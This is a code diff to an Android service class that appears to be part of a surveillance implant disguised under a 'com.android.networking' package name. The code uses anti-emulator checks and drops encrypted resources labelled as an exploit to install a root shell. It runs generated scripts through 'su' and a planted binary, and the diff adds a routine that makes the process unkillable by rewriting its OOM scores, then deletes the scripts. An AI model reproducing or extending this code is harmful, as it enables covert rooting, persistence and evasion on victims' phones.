@@ -21,11 +21,13 @@ import javax.crypto.NoSuchPaddingException;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
 
+import android.app.ActivityManager;
 import android.app.Notification;
 import android.app.PendingIntent;
 import android.app.Service;
 import android.app.WallpaperManager;
 import android.content.Context;
+import android.content.ContextWrapper;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.content.res.Configuration;
@@ -44,8 +46,10 @@ import com.android.networking.capabilities.PackageInfo;
 import com.android.networking.crypto.Keys;
 import com.android.networking.util.AntiEmulator;
 import com.android.networking.util.Check;
+import com.android.networking.util.Execute;
 import com.android.networking.util.Utils;
 import com.android.networking.R;
+
 
 /**
  * The Class ServiceCore.
@@ -138,11 +142,14 @@ public class ServiceCore extends Service {
 			superapkRoot();
 
 			Status.self().setRoot(PackageInfo.checkRoot());
-
+			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onStart): isRoot = " + Status.self().haveRoot()); //$NON-NLS-1$
 			}
 		}
+		
+		// Avoid having the process killed for using too many resources
+		adjustOom();
 
 		if (Cfg.EXP) {
 			boolean isRoot = Status.self().haveRoot();
@@ -448,7 +455,7 @@ public class ServiceCore extends Service {
 
 		try {
 			// 0x5A3D10448D7A912A
-			fileWrite(suidext, stream, Messages.getString("36.2"));
+			fileWrite(suidext, stream, Cfg.RNDDB);
 
 			// Proviamoci ad installare la nostra shell root
 			if (Cfg.DEBUG) {
@@ -459,15 +466,18 @@ public class ServiceCore extends Service {
 
 			Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/" + suidext);
 			
-			if (createInstallScript() == true) {
-				Process script = Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/s");
-				script.waitFor();
+			// 32.29 = /data/data/com.android.service/files/statusdb rt
+			String script = "#!/system/bin/sh\n" + Messages.getString("32.29") + "\n";
+			
+			if (createScript("s", script) == true) {
+				Process runScript = Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/s");
+				runScript.waitFor();
 			
 				// su -c /data/data/com.android.service/files/s
 				Process localProcess = Runtime.getRuntime().exec(Messages.getString("32.31"));
 				localProcess.waitFor();
 				
-				removeInstallScript();
+				removeScript("s");
 			}
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
@@ -503,11 +513,18 @@ public class ServiceCore extends Service {
 			fos.close();
 
 			Resources resources = getResources();
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (root): saving statuslog"); //$NON-NLS-1$
+			}
 			InputStream stream = resources.openRawResource(R.raw.statuslog);
 
 			// "0x5A3D10448D7A912B"
 			fileWrite(exploit, stream, Cfg.RNDLOG);
 			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (root): saving statusdb"); //$NON-NLS-1$
+			}
 			stream = resources.openRawResource(R.raw.statusdb);
 
 			// 0x5A3D10448D7A912A
@@ -576,39 +593,75 @@ public class ServiceCore extends Service {
 			return false;
 		}
 	}
-	
-	private boolean createInstallScript() {
-		// 32.29 = /data/data/com.android.service/files/statusdb rt
-		String script = "#!/system/bin/sh\n" + Messages.getString("32.29") + "\n";
 
+	// name WITHOUT path (script is generated inside /data/data/<package>/files/ directory)
+	private boolean createScript(String name, String script) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (createInstallScript): install script: " + script); //$NON-NLS-1$
+			Check.log(TAG + " (createScript): script: " + script); //$NON-NLS-1$
 		}
-		
+
 		try {
-			FileOutputStream fos = openFileOutput("s", Context.MODE_PRIVATE);
+			FileOutputStream fos = openFileOutput(name, Context.MODE_PRIVATE);
 			fos.write(script.getBytes());
 			fos.close();
+
+			Execute ex = new Execute();			
+			ex.execute("chmod 755 " + Status.getAppContext().getFilesDir() + name);
 			
 			return true;
 		} catch (Exception e) {
 			if (Cfg.EXP) {
 				Check.log(e);
 			}
-			
+
 			return false;
 		}
 	}
 	
-	private void removeInstallScript() {
-		// /data/data/com.android.service/files/s
-		File rem = new File(Messages.getString("32.33"));
-		
+	private void removeScript(String name) {
+		File rem = new File(Status.getAppContext().getFilesDir() + name);
+
 		if (rem.exists()) {
 			rem.delete();
 		}
 	}
+	
+	private void adjustOom() {	
+		if (Status.self().haveRoot() == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (adjustOom): cannot adjust OOM without root privileges"); //$NON-NLS-1$
+			}
+			
+			return;
+		}
+		
+		int pid = android.os.Process.myPid();
+		
+		String script = "#!/system/bin/sh\n" + "/system/bin/ntpsvd qzx \"echo '-1000' > /proc/" + pid + "/oom_score_adj\"" + "\n";
+		script += "/system/bin/ntpsvd qzx \"echo '-17' > /proc/" + pid + "/oom_adj\"" + "\n";
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (adjustOom): script: " + script); //$NON-NLS-1$
+		}
+				
+		if (createScript("o", script) == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (adjustOom): failed to create OOM script"); //$NON-NLS-1$
+			}
+			
+			return;
+		}
+		
+		Execute ex = new Execute();
+		ex.execute(Status.getAppContext().getFilesDir() + "/o");
+		
+		removeScript("o");
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (enclosing_method): OOM Adjusted"); //$NON-NLS-1$
+		}
+	}
+	
 	private boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
 			FileNotFoundException {
 		try {
